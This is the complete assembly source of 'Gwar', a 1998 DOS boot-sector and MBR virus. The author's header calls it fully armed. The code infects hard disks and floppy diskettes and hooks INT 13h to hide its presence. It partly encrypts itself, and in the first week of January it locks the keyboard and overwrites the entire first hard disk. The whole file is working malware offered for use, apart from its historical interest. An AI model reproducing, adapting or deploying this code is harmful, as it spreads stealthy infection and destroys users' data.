;============================================================================
;
;      NAME: Gwar-virus [v1.10].
;      TYPE: Resident stealth bootsector/MBR infector
;   TARGETS: Harddrives, 360k & 1.44M diskettes.
;    AUTHOR: T-2000 / Invaders.
;      SIZE: 1 sector.
;      DATE: February 1998 / May 1998.
;
;     !!!!!!!!!! WARNiNG: THiS ViRUS iS FULLY ARMED! !!!!!!!!!!!!!
;
; Tried to put as many as possible in one sector:
;
;       - Full stealth on infected bootsectors/MBR's.
;       - Payload: message, disk-trashing & screendumping.
;       - Hides in interrupt-table.
;       - Anti-Debugger trick.
;       - Variable encrypting (message + part of virus).
;       - Generation counter.
;       - Variable store-sector on harddisk (2 - 17).
;       - Re-directs writes to boot-area.
;
; This is a very handy virus, because it only 1 sector long. Due the minimal
; length, it can operate very fastly and doesn't consume much disk and
; memory space. It also uses the upper part of the interrup-table to store
; its code, instead of lowering the DOS-memory and put it there. This way
; Windows 95/NT will not complain that a bootvirus may be active. With the
; sector-stealth also, it will almost be hidden to programs, and the human-
; eye. The only way to detect it by eye will be to check the 2nd part of
; the interrupt-table (bytes 512-1024).
;
; PROBLEMS: Since Windows 95/NT are using their own routines to read from
;           the harddrive (port-level access), computers infected with
;           Gwar will probably crash. Reason for this is that virus cannot
;           stealth bootsectors. I have not tested this. I removed a anti-
;           tracer trick because QEMM triggered it.
;
; OPTIMIZING: The virus is highly optimised, but can be further done.
;             (line using the INT which is located in Int13h). *DONE*
;
;             The virus is mostly optimized, but can be more. This isn't
;             done because I don't know what to put it instead.
;             Further optimisation would make it REAL messy!
;             The optimisation could make it look a bit messy.
;
;  Many tracers probably cannot trace thru the INT because Gwar uses an
;  INT 0FEh to access the old interrupt, and single-step is disabled while
;  invoking an interrupt.
;
;
; SPECIAL REMARKS: School Sucks! Fuck 'It!
;
; The virus is not designed to be a good learning source. The main goal was
; to write everything functionally good.
;============================================================================

                .MODEL  TINY            ; Remove these lines when you're
                .CODE                   ; including it in Messev.

                ORG     0

Marker_Boot     EQU     0104h
Revector        EQU     0FEh
Marker_Mem_Gwar EQU     0CDCDh


                ; == Bootsector entrypoint ==

                JMP     SHORT Gwar_Start
                NOP

                ; === Data-table of a 1.44M disk. ===

                DB      4Dh,  53h, 44h,  4Fh, 53h, 35h
                DB      2Eh,  30h, 00h,  02h, 01h, 01h
                DB      00h,  02h, 0E0h, 00h, 40h, 0Bh
                DB      0F0h, 09h, 00h,  12h, 0h,  02h
                DB      00h,  00h, 00h,  00h, 00h, 00h
                DB      00h,  00h, 00h,  00h, 00h, 29h
                DB      0ECh, 16h, 29h, 18h
                DB      'GWAR-VIRUS '           ; Volumelabel.
                DB      'FAT12   '              ; Filesystem.

Gwar_Start:
                XOR     DI, DI
                MOV     SI, 7C00h

                CLI
                MOV     SS, DI                  ; Set-up stack.
                MOV     SP, SI
                STI

                MOV     DS, DI

                MOV     AX, 20h
                MOV     ES, AX                  ; 2nd part interrupt-table.

                CLD                             ; Copy virus to virussegment.
                MOV     CX, 256
                REP     MOVSW

                MOV     AX, OFFSET Relocated
                
                PUSH    ES                      ; Jump to relocated virus
                PUSH    AX                      ; in virussegment.
                RETF


Relocated:      CALL    Crypt_Block             ; Decrypt code which
                                                ; is in front of us.
Encrypted:
                MOV     AH, 04h                 ; Get date.
                INT     1Ah

                CMP     DX, 0107h               ; First week of January?
                JA      No_PayLoad              ; Not... luck for them!

PayLoad:
                IN      AL, 21h                 ; Disable keyboard:
                OR      AL, 02h                 ; No warm reboot, gives
                OUT     21h, AL                 ; us some time).

                PUSH    CS
                POP     ES

                MOV     AX, 03h                 ; Clear screen.
                INT     10h

                MOV     AH, 01h                 ; Turn-off cursor.
                MOV     CH, 20h
                INT     10h

                MOV     AX, 1301h               ; Display message.
                MOV     BX, 0CFh
                MOV     CX, 22
                MOV     DX, 0D1Dh
                MOV     BP, OFFSET Message
                INT     10h

                MOV     CX, 01h                 ; Start with MBR.

Trash_Loop:     CMP     BYTE PTR DS:[500h], 0   ; PrtScr busy?
                JNZ     Not_Ready
                INT     05h                     ; Print screen.
Not_Ready:      XOR     AH, AH                  ; Reset 1st harddisk.
                MOV     DL, 80h
                INT     13h

                MOV     AX, 0308h               ; This effectively destroys
                MOV     BX, OFFSET Texts        ; all data on the harddisk.
                MOV     DX, 80h
                INT     13h

                ADD     CX, 8                   ; Next 8 sectors.
                JMP     SHORT Trash_Loop

Texts:

Message         DB      ' Gwar virus by T-2000 ', 0
Version_Num     DB      'v1.10'

No_Payload:

                ; Hook INT 13h.

                CLD
                MOV     SI, 13h * 4
                MOV     DI, OFFSET Int13h

                CLI
                MOVSW
                MOVSW
                MOV     WORD PTR DS:[13h * 4], OFFSET NewInt13h
                MOV     WORD PTR DS:[13h * 4 + 2], CS
                STI

                PUSH    DS
                POP     ES

                PUSH    CS
                POP     DS

End_Encrypted:
                CALL    Crypt_Block             ; Re-encrypt block.

                MOV     AX, 0201h               ; Read bootsector of 1st
                MOV     BX, 7C00h               ; harddrive via INT 13h,
                MOV     CX, 01h                 ; so virus will infect it.
                MOV     DX, 80h
                INT     13h

                MOV     AX, 0201h               ; Load old bootsector.
                MOV     CX, 0
                ORG     $-2
Stored_TS       DW      000Fh
                MOV     DX, 0
                ORG     $-2
Stored_HD       DW      0100h
                INT     Revector

                PUSH    ES                      ; Handle control over to
                PUSH    BX                      ; original bootsector.
                RETF


NewInt13h:
                CMP     AX, Marker_Mem_Gwar
                JNE     No_Res_Check

                NOT     AX

                IRET

No_Res_Check:
                CMP     AH, 02h                 ; Doing a read?
                JE      Check_Params
 
                CMP     AH, 03h                 ; Write?
                JNE     JMP_Exit_Int

Check_Params:   OR      DH, DH                  ; Head 0?
                JNZ     JMP_Exit_Int

                CMP     CX, 01h                 ; Bootsector/MBR?
                JNE     JMP_Exit_Int

                INT     Revector                ; Execute function.
                JC      Exit                    ; Exit if error occurred.

                CALL    Reading_Boot            ; Infect it when clean.

Exit:           RETF    2                       ; Return to caller.

JMP_Exit_Int:   JMP     DWORD PTR CS:[Int13h]


Reading_Boot:
                PUSHF                           ; Save registers & flags.
                PUSH    AX
                PUSH    BX
                PUSH    CX
                PUSH    DX
                PUSH    SI
                PUSH    DI
                PUSH    DS
                PUSH    ES

                PUSH    CS
                POP     DS

                IN      AL, 21h                 ; Disable keyboard.
                OR      AL, 02h
                OUT     21h, AL

                MOV     AX, Stored_TS
                PUSH    AX
                MOV     AX, Stored_HD
                PUSH    AX

                CMP     WORD PTR ES:[BX+Signature], Marker_Boot
                JNE     Infect_Diskette

                ; At this point we got a infected bootsector in
                ; the caller's buffer, so we need to re-read the
                ; original one stored elsewhere on disk.

                MOV     AX, 0201h
                MOV     CX, ES:[BX+Stored_TS]
                MOV     DX, ES:[BX+Stored_HD]
                INT     Revector

                JMP     SHORT Exit_Int13h

Infect_Diskette:

                CMP     DL, 80h                 ; Is it a harddrive?
                JB      Init_Diskette           ; No, then init diskette.

                IN      AX, 40h                 ; Get random value.
                XOR     AL, AH
                AND     AL, 00001111b           ; Between 0 & 15.
                XOR     AH, AH
                INC     AX                      ; Must be above 1.
                INC     AX

                XCHG    CX, AX
                XOR     DH, DH

                JMP     SHORT Init_Disk

Init_Diskette:
                MOV     DH, 01h                 ; Head 1.
                XOR     CH, CH

                CMP     BYTE PTR ES:[BX+15h], 0FDh  ; 360k
                JNE     Check_144M

                MOV     CL, 03h                 ; Last sector root-dir.

                JMP     SHORT Init_Disk
Check_144M:
                CMP     BYTE PTR ES:[BX+15h], 0F0h      ; HD-diskette?
                JNE     Exit_Int13h                     ; Bail-out when not.

                MOV     CL, 0Fh                 ; Last sector root-dir.

Init_Disk:
                MOV     Stored_TS, CX           ; Location of original
                MOV     Stored_HD, DX           ; bootsector on disk.

                XOR     AH, AH                  ; Reset disk.
                INT     Revector

                MOV     AX, 0301h               ; Store old bootsector.
                INT     Revector
                JC      Exit_Int13h

                CALL    Crypt_Block             ; Decrypt block.

                IN      AL, 40h                 ; Get another key.
                MOV     Key, AL

                CALL    Crypt_Block             ; Encrypt back on with
                                                ; other key.
                PUSH    ES
                POP     DS

                PUSH    CS
                POP     ES

                CLD                             ; Copy datablock into virus
                MOV     SI, BX                  ; bootsector.
                MOV     DI, 3
                ADD     SI, DI
                MOV     CX, 29
                REP     MOVSW

                PUSH    CS
                POP     DS

                MOV     AX, 0                   ; Generation counter.
                ORG     $-2
Generation      DW      0                       ; 16-Bit generation counter.

                INC     AX
                JZ      No_Update               ; Don't update when overflow.

                MOV     Generation, AX

No_Update:      MOV     AX, 0301h               ; Write infected bootsector.
                XOR     BX, BX
                MOV     CX, 01h
                XOR     DH, DH
                INT     Revector

Exit_Int13h:
                POP     AX
                MOV     Stored_HD, AX
                POP     AX
                MOV     Stored_TS, AX

                IN      AL, 21h                 ; Return their keyboard.
                AND     AL, NOT 02h
                OUT     21h, AL

                POP     ES                      ; Restore registers & flags.
                POP     DS
                POP     DI
                POP     SI
                POP     DX
                POP     CX
                POP     BX
                POP     AX
                POPF

                RETN


                ; === XOR message + part of virus. ===
Crypt_Block:
                MOV     SI, OFFSET Encrypted
                MOV     CX, (OFFSET End_Encrypted - OFFSET Encrypted)
Crypt_Byte:
                XOR     BYTE PTR CS:[SI], 0
                ORG     $-1
Key             DB      0               ; 8-Bit encryption-key for install.
                INC     SI
                LOOP    Crypt_Byte

                RETN



                ;ORG     504            ;

Int13h          DW      0, 0            ; Old INT 13h address.
Signature       DW      Marker_Boot     ; Already-infected-marker.
                DW      0AA55h          ; Bootable disk signature.

                END                     ; Remove dis 4 inclusion in Messev.
